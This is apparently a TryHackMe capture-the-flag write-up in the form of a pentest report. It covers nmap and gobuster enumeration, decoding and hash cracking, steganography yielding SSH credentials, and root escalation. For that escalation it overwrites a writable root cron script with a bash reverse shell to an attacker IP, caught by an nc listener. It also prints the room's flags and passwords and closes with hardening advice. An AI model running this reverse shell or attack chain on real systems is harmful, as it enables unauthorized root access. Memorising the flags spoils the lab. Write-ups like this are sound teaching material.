
A THM Room 

By Sovren

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.


# Executive Summary

A penetration test was conducted against the target host to identify vulnerabilities that could allow an attacker to gain unauthorized access to the system.

The assessment revealed several security weaknesses including:

- Exposed web services containing hidden directories
    
- Sensitive data disclosure through encoded values
    
- Weak credential storage practices
    
- Information hidden via steganography
    
- Poor system hardening and insecure cron job permissions
    

By chaining these weaknesses together, full compromise of the system was achieved. The tester successfully obtained:

- Multiple flags indicating sensitive information disclosure
    
- Valid SSH credentials
    
- A low-privileged user shell
    
- Root privileges through a writable cron job
    

This demonstrates that an attacker with minimal initial access could escalate privileges and gain complete control of the system.


# Reconnaissance 

`sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.112.140.143 -p-`

==`Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 17:14 +0000`==
==`Nmap scan report for 10.112.140.143`==
==`Host is up (0.032s latency).`==
==`Not shown: 65532 closed tcp ports (reset)`==
==`PORT      STATE SERVICE VERSION`==
==`80/tcp    open  http    nginx 1.16.1`==
==`|_http-title: Welcome to nginx!`==
==`| http-robots.txt: 1 disallowed entry`== 
==`|_/`==
==`6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`==
==`| ssh-hostkey:`== 
==`|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)`==
==`|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)`==
==`|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)`==
==`65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))`==
==`|_http-title: Apache2 Debian Default Page: It works`==
==`| http-robots.txt: 1 disallowed entry`== 
==`|_/`==
==`Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)`


# Enumeration 

`gobuster dir -u http://10.112.140.143 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

`hidden               (Status: 301) [Size: 169] [--> http://10.112.140.143/hidden/]`

---

`gobuster dir -u http://10.112.140.143/hidden -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

`whatever             (Status: 301) [Size: 169] [--> http://10.112.140.143/hidden/whatever/]`

ZmxhZ3tmMXJzN19mbDRnfQ== is found in the /whatever directory. It is base64 encoded data that reveals the First Flag. 

---

`gobuster dir -u http://10.112.140.143:65524 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt` 

`web0                 (Status: 301) [Size: 324] [--> http://10.112.140.143:65524/web0/]`

---

`gobuster dir -u http://10.112.140.143:65524/web0 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

`hidden               (Status: 301) [Size: 331] [--> http://10.112.140.143:65524/web0/hidden/]`

---

#### /robots.txt

Hashes are stored in the /robots.txt directory on port 66524 and can be decrypted to provide one of the flags.  

#### Inspecting the default Webpage on Port 65524

Page source reveals a lot here:
Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}

There also seems to be some hidden text:
its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu

The snippet above can be decoded with Base62:

**/n0th1ng3ls3m4tt3r**

#### /n0th1ng3ls3m4tt3r 

A hash can be found on the page or viewed from source in the **/n0th1ng3ls3m4tt3r** directory. Hash-identifier flags it as either sha-256 or haval-256. The hint in the room, as well as ChatGPT, advise to you use the gost format:

`john --format=gost --wordlist=/home/sovren/epeasy.txt hash1.txt`  
mypasswordforthatjob

There was some steganography included in this room:
wget http://10.112.140.143:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg

`stegseek binarycodepixabay.jpg /home/sovren/epeasy.txt` 

`StegSeek 0.6 - https://github.com/RickdeJager/StegSeek`

`[i] Found passphrase: "mypasswordforthatjob"`
`[i] Original filename: "secrettext.txt".`
`[i] Extracting to "binarycodepixabay.jpg.out".`


`cat binarycodepixabay.jpg.out`
==`username:boring`==
==`password:`==
==`01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001`==

Use the From Binary recipe in cyberchef:
`iconvertedmypasswordtobinary`

SSH into the machine on port 6498 with the following credentials:
==`boring:iconvertedmypasswordtobinary`==
==`ssh boring@10.112.140.143 -p 6498`==

`cat user.txt`
`synt{a0jvgf33zfa0ez4y}`

Use a decoder to rotate the cipher:
==`flag{n0wits33msn0rm4l}`==

# Privilege Escalation

`uname -a` 
==`Linux kral4-PC 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`==


`cat /etc/crontab` 
==`* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh`==


`find / -perm -4000 2>/dev/null`
==`/usr/lib/dbus-1.0/dbus-daemon-launch-helper`==
==`/usr/lib/openssh/ssh-keysign`==
==`/usr/lib/policykit-1/polkit-agent-helper-1`==
==`/usr/lib/eject/dmcrypt-get-device`==
==`/usr/sbin/pppd`==
==`/usr/bin/sudo`==
==`/usr/bin/pkexec`==
==`/usr/bin/chfn`==
==`/usr/bin/passwd`==
==`/usr/bin/gpasswd`==
==`/usr/bin/newgrp`==
==`/usr/bin/chsh`==
==`/usr/bin/traceroute6.iputils`==
==`/bin/ping`==
==`/bin/mount`==
==`/bin/fusermount`==
==`/bin/su`==
==`/bin/umount`==

Overwrite the secret cronjob to send out a shell with:
`echo "bash -i >& /dev/tcp/192.168.133.66/1234 0>&1" > .mysecretcronjob.sh`

And set up a listener on the attacking machine:
`nc -lvnp 1234`

Shell is then sent out within a minute and gives access to root. 

flag is found at `/root/.root.txt` 
==`flag{63a9f0ea7bb98050796b649e85481845}`==


---

# Recommendations

### Restrict Directory Access

Hidden directories should not contain sensitive data or credentials.

### Remove Encoded Secrets

Encoding is not encryption. Sensitive information must never be stored using reversible encoding schemes.

### Secure File Permissions

Ensure scripts executed by root are not writable by unprivileged users.

Recommended permission example:

chmod 700 script.sh  
chown root:root script.sh

### Cron Job Hardening

Cron jobs should execute scripts located in protected directories such as:

/root/scripts  
/usr/local/sbin

### Regular Security Audits

Routine vulnerability assessments and patch management should be implemented to detect and remediate weaknesses early.

---
# Conclusion

The system contained several security weaknesses that allowed an attacker to escalate privileges from unauthenticated access to full root compromise.

The most critical issue was a writable root cron job, which allowed arbitrary command execution as root.

By implementing proper access controls, secure credential storage, and hardened cron job configurations, the risk of system compromise can be significantly reduced.